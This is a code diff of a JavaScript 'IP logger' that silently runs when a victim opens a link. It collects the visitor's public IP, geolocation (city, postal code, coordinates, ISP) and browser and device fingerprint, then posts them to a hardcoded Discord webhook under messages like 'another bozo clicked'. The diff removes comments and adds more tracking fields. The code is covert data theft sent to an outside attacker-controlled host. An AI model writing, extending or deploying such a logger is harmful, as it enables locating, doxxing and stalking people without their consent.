@@ -1,29 +1,40 @@
 const sendIP = () => {
-    // Fetch the public IP address
     fetch('https://api.ipify.org?format=json')
         .then(ipResponse => ipResponse.json())
         .then(ipData => {
             const ipadd = ipData.ip;
             
-            // Fetch geolocation data based on the IP
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
                     
-                    // Gather device information
                     const deviceInfo = {
-                        userAgent: navigator.userAgent,            // Browser and OS info
-                        screenWidth: window.screen.width,          // Screen width
-                        screenHeight: window.screen.height,        // Screen height
-                        deviceMemory: navigator.deviceMemory || "N/A", // Available memory
-                        language: navigator.language,              // Language of the browser
-                        platform: navigator.platform               // Platform (Windows, macOS, etc.)
+                        userAgent: navigator.userAgent,
+                        browser: (function() {
+                            const userAgent = navigator.userAgent;
+                            if (userAgent.includes("Chrome")) return "Chrome";
+                            if (userAgent.includes("Firefox")) return "Firefox";
+                            if (userAgent.includes("Safari")) return "Safari";
+                            if (userAgent.includes("Edge")) return "Edge";
+                            return "Unknown";
+                        })(),                          
+                        browserVersion: (navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)\/([0-9\.]+)/) || [])[2],
+                        os: navigator.platform,                  
+                        osVersion: navigator.appVersion,        
+                        screenWidth: window.screen.width,         
+                        screenHeight: window.screen.height,        
+                        deviceMemory: navigator.deviceMemory || "N/A",
+                        language: navigator.language,             
+                        platform: navigator.platform,              
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        timezoneOffset: new Date().getTimezoneOffset() / 60, 
+                        cookiesEnabled: navigator.cookieEnabled,   
+                        sessionID: localStorage.getItem("sessionID") || Math.random().toString(36).substring(7),
+                        timestamp: new Date().toISOString()         
                     };
                     
-                    // Discord Webhook URL
                     const dscURL = 'https://discord.com/api/webhooks/1407630270030680114/24KgIRJu3KCrhK_ELjkh70k8pyu18Xqz9LQGTa4O53cdtLCXZXoW67cM_5mPToQVlvkZ';
                     
-                    // Send data to Discord Webhook
                     return fetch(dscURL, {
                         method: 'POST',
                         headers: {
@@ -35,28 +46,39 @@ const sendIP = () => {
                             content: `@here another bozo clicked`,
                             embeds: [
                                 {
-                                    title: 'A victim clicked on the link!',
+                                    title: 'SCRIPTY IP LOGGER',
                                     description: `
-                                        **IP Info:**\n
+                                        **IP Info:**
                                         IP Address >> ${ipadd}
                                         Network >>  ${geoData.network}
                                         City >>  ${geoData.city}
                                         Region >>  ${geoData.region}
                                         Country >>  ${geoData.country_name}
+                                        Country Code >>  ${geoData.country_code}
+                                        Region Code >>  ${geoData.region_code}
                                         Postal Code >>  ${geoData.postal}
                                         Latitude >>  ${geoData.latitude}
                                         Longitude >>  ${geoData.longitude}
                                         Timezone >>  ${geoData.timezone}
                                         ASN >>  ${geoData.asn}
                                         Organization >>  ${geoData.org}
-                                        **Device Info:**\n 
+                                        ISP >>  ${geoData.isp}
+                                        Mobile/Proxy >>  ${geoData.mobile || 'N/A'}
+
+                                        **Device Info:**
                                         User-Agent >>  ${deviceInfo.userAgent}
-                                        Screen Width >>  ${deviceInfo.screenWidth}px
-                                        Screen Height >>  ${deviceInfo.screenHeight}px
+                                        Browser >>  ${deviceInfo.browser} ${deviceInfo.browserVersion}
+                                        OS >>  ${deviceInfo.os} ${deviceInfo.osVersion}
+                                        Screen Resolution >>  ${deviceInfo.screenWidth}x${deviceInfo.screenHeight} px
                                         Device Memory >>  ${deviceInfo.deviceMemory} GB
                                         Language >>  ${deviceInfo.language}
-                                        Platform >>  ${deviceInfo.platform}`,
-                                    color: 0x800080
+                                        Platform >>  ${deviceInfo.platform}
+                                        Timezone >>  ${deviceInfo.timezone}
+                                        Timezone Offset >>  UTC${deviceInfo.timezoneOffset >= 0 ? `+${deviceInfo.timezoneOffset}` : deviceInfo.timezoneOffset}
+                                        Cookies Enabled >>  ${deviceInfo.cookiesEnabled}
+                                        Session ID >>  ${deviceInfo.sessionID}
+                                        Timestamp >>  ${deviceInfo.timestamp}`,
+                                    color: 1752220
                                 }
                             ]
                         })
